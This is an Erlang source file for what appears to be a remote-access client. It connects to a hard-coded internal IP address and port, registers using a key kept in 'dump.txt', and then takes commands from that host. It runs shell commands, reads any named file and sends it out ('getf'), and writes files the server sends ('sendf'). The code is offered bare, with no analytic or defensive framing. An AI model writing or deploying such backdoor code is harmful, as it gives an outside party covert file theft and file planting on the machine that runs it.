-module(home).
-export([start/0]).
%27517
start() ->
    {ok, Socket} = gen_tcp:connect({172,19,4,57}, 27517, [binary, {active,false}]),
    case file:read_file("dump.txt") of
        {ok, BinaryFile} ->
            case BinaryFile of
                <<>> ->
                    gen_tcp:send(Socket,<<"hello">> ),
                    case gen_tcp:recv(Socket,0) of
                        {ok, Packet} ->
                            case Packet of
                                <<"youkey ",Pack/binary>> ->
                                    io:format("~p~n",[Pack]),
                                    file:write_file("dump.txt", Pack),
                                    loop(Socket);
                                _ ->
                                    start()
                            end;
                        {error, Reason} ->
                            io:format("error:~p~n",[Reason])
                    end;
                _ ->
                    io:format("send ~p~n file",[BinaryFile]),
                    gen_tcp:send(Socket, BinaryFile),
                    case gen_tcp:recv(Socket,0) of
                        {ok, Packet} ->
                            case Packet of
                                <<"clear ",Pack/binary>> ->
                                    io:format("~p~n",[Pack]),
                                    file:write_file("dump.txt", Pack),
                                    loop(Socket);
                                _ ->
                                    loop(Socket)
                            end;
                        {error, Reason} ->
                            io:format("error:~p~n",[Reason])
                    end
            end;
        _ ->
            file:open("dump.txt", exclusive),
            start()
    end.

loop(Socket) ->
    case gen_tcp:recv(Socket,0) of
        {ok, Packet} ->
            case Packet of
                <<"ls">> ->
                    LsOut = os:cmd("cd ..\nls"),
                    io:format("outResultCmd:~p~n",[LsOut]),
                    io:format("Cmd:~p~n",[Packet]),
                    loop(Socket);
                <<"getf ",Pack/binary>> ->
                    case file:read_file(binary_to_list(Pack)) of
                        {ok, BinaryFile} ->
                            io:format("send ~p~n file",[BinaryFile]),
                            gen_tcp:send(Socket, BinaryFile),
                            loop(Socket);
                        {error, Reason} ->
                            io:format("error:~p~n",[Reason])
                    end;
                <<"sendf ",Pack/binary>> ->
                    {ok, Size} = gen_tcp:recv(Socket,0),
                    io:format("~p~n~p~n",[Pack,Size]),
                    case gen_tcp:recv(Socket,binary_to_integer(Size)) of
                        {ok, BinaryFile} ->
                            io:format("~p~n",[BinaryFile]),
                            file:write_file(binary_to_list(Pack), BinaryFile),
                            loop(Socket);
                        {error, Reason} ->
                            io:format("error:~p~n",[Reason])
                    end;
                _ ->
                    io:format("errorCmd:~p~n",[Packet])
            end;
        {error, Reason} ->
            io:format("error:~p~n",[Reason])
    end.
